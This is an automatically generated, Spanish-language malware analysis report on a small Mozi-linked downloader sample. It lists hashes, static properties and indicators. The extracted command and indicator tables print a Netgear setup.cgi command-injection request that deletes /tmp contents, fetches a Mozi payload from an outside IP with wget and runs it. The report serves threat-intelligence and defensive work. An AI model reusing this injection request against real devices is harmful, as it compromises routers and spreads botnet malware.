# 🧬 Payload Analysis

`8329d8b638ac6cbf2ae017d1acc289c4a756205cc085c1e02b194d5c0b16e818`

## 📌 Resumen

Texto ASCII de 177 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://182.233.211.XXX:44410/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://182.233.211.XXX:44410/Mozi.m -O /tmp/netge` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/8329d8b638ac6cbf2ae017d1acc289c4a756205cc085c1e02b194d5c0b16e818.md](../../../../../malware-like/oraculo/downloader/8329d8b638ac6cbf2ae017d1acc289c4a756205cc085c1e02b194d5c0b16e818.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:42:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8329d8b638ac6cbf2ae017d1acc289c4a756205cc085c1e02b194d5c0b16e818`
- **MD5:** `f6ae910cd8914b38beeb757fc9e4721e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 177 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://182.233.211.XXX:44410/Mozi.m+-O+/tmp/netge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://182.233.211.XXX:44410/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 182.233.211.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://182.233.211.XXX:44410/Mozi.m+-O+/tmp/netge | strings |
| hash | 8329d8b638ac6cbf2ae017d1acc289c4a756205cc085c1e02b194d5c0b16e818 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
